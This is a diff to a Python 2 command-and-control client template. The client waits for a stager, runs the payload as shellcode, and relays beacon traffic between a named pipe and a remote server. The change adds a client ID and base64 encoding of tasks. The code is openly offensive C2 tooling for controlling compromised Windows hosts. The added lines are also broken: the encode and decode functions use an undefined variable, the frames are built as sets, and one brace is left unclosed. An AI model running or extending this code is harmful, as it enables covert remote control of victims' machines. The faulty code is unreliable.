@@ -1,9 +1,9 @@
 from ctypes import *
-from ctypes.wintypes import *
 import struct
 from sys import exit
 from time import sleep
 import win32file
+import base64
 
 # <encoder imports>
 
@@ -31,6 +31,7 @@ import win32file
 
 # Client core
 C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
+CLIENT_ID = ```[var:::client_id]```
 
 def start_beacon(payload):
     shellcode =  bytearray(payload)
@@ -86,6 +87,12 @@ def WritePipe(handle,chunk):
     print "Writing to pipe: %s" %(chunk)
     return write_frame(handle, chunk)
 
+def task_encode(task):
+    return base64.b64encode(data)
+
+def task_decode(task):
+    return base64.b64decode(data)
+
 def go():
     print "Waiting for stager..."
     p = recvData()
@@ -111,16 +118,19 @@ def interact(handle_beacon):
             else:
                 print "Received %d bytes from pipe" % (len(chunk))
             print "relaying chunk to server"
-            sendData(chunk)
+            resp_frame = {CLIENT_ID, task_encode(chunk)}
+            sendData(resp_frame)
 
             # LOGIC TO CHECK FOR A NEW TASK
             print "Checking for new tasks from transport"
             
             newTask = recvData()
 
-            print "Got new task: %s" % (newTask)
-            print "Writing %s bytes to pipe" % (len(newTask))
-            r = WritePipe(handle_beacon, newTask)
+            newTask_frame = {newTask[0], task_decode(newTask[1])
+
+            print "Got new task: %s" % (newTask_frame[1])
+            print "Writing %s bytes to pipe" % (len(newTask_frame[1]))
+            r = WritePipe(handle_beacon, newTask_frame[1])
             print "Wrote %s bytes to pipe" % (r)
             sleep(C2_BLOCK_TIME/100)
     except KeyboardInterrupt:
